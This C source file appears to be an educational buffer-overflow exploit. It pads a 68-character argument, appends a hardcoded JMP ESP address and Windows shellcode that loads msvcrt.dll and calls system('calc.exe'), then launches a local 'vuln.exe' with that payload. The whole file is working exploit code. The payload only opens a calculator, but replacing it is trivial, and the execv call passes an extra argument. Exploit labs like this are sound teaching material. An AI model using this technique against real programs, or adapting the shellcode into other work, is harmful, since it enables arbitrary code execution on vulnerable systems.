#include <string.h>
#include <stdlib.h>
#include <stdio.h>


int main (int argc, char **argv)
{
    if (argc < 2 || argc > 2)
    {
        printf("Please, introduce only one argument");
        return 0;
    }
    // The argument must have 68 characters, because it's the point where it overflows
    if (strlen(argv[1]) != 68)
    {
        printf("Please, introduce one argument with 68 characters");
        return 0;
    }
	char *final_str[3];
    char buffer[1024];
    char jmp_esp[]="\x7b\x46\x86\x7c";
    // This is the exact direction where we have to make the memory jump.
    char calc_code[]="\x55\x8b\xec\x33\xff\x57\x83\xec\x0c\xc6\x45\xf5\x6d\xc6\x45\xf6\x73\xc6\x45\xf7\x76\xc6\x45\xf8\x63"
					"\xc6\x45\xf9\x72\xc6\x45\xfa\x74\xc6\x45\xfb\x2e\xc6\x45\xfc\x64\xc6\x45\xfd\x6c\xc6\x45\xfe\x6c\x8d\x45"
					"\xf5\x50\xbb\x7b\x1d\x80\x7c\xff\xd3\x55\x8b\xec\x33\xff\x57\x83\xec\x08\xc6\x45\xf7\x63\xc6\x45\xf8\x61"
					"\xc6\x45\xf9\x6c\xc6\x45\xfa\x63\xc6\x45\xfb\x2e\xc6\x45\xfc\x65\xc6\x45\xfd\x78\xc6\x45\xfe\x65\x8d\x45"
					"\xf7\x50\xbb\xc7\x93\xc2\x77\xff\xd3";
    // This is the shell code that executes the calc.exe
    int i = 0;
    while (argv[1][i])
    {
        buffer[i] = argv[1][i];
        i++;
    }
    buffer[i] = '\0';
    strcat(buffer,jmp_esp);                 // We have to concatenate everything in the same string,
    strcat(buffer,calc_code);               // to pass it to the vulnerable program in the same argument
    final_str[0] = "vuln";
    final_str[1] = buffer;
    final_str[2] = NULL;
    execv("vuln.exe", final_str, NULL);
}
